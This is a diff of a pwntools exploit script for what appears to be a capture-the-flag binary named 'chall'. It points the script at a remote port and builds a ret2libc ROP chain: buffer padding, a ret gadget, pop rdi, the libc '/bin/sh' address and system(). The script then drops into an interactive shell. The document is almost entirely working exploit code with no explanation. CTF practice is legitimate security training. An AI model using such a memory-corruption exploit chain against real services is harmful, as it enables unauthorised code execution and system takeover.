@@ -36,10 +36,10 @@ def main():
     '''
 
     NOTE_SIZE = 100
-    HOST = ""
-    PORT = 0
+    HOST = "localhost"
+    PORT = 9005
 
-    local = True 
+    local = False
     elf = ELF("./chall")
     libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
 
@@ -71,29 +71,36 @@ def main():
     
     libc_base = libc_leak - 0x3ed8d0
     libc.address = libc_base 
+    system_addr = libc_base + 0x4f4e0
+
     log.info(f"Libc base: {hex(libc_base)}")
+    log.info(f"System : {hex(system_addr)}")
     p.sendlineafter("Description: ", "BB")
+
     #========== STEP 3 ============
     #building the rop chain
+    ret = 0x0000000000401016
+    pop_rdi = 0x000000000040170b
+    add_note = 0x00401597
+    bin_sh = next(libc.search(b"/bin/sh"))
+    log.info(f"/bin/sh : {hex(bin_sh)}")
 
-    rop = ROP(elf)
-    ret = rop.find_gadget(["ret"]).address
-    add_note = 0x004015d7
-    
     ropchain = flat(
 
         b"A" * 40, 
         p64(ret),
-        p64(add_note)
+        p64(pop_rdi), 
+        p64(bin_sh), 
+        p64(system_addr)
     )
 
     get_secret_menu(p)
-    p.sendlineafter("Note: ", "AA")
+    p.sendlineafter("Note: ", "AAA")
     p.sendlineafter("Description: ", ropchain)
 
-    data = p.recv()
-    print(data)
+    p.interactive()
 
 if __name__ == "__main__":
 
     main()
+
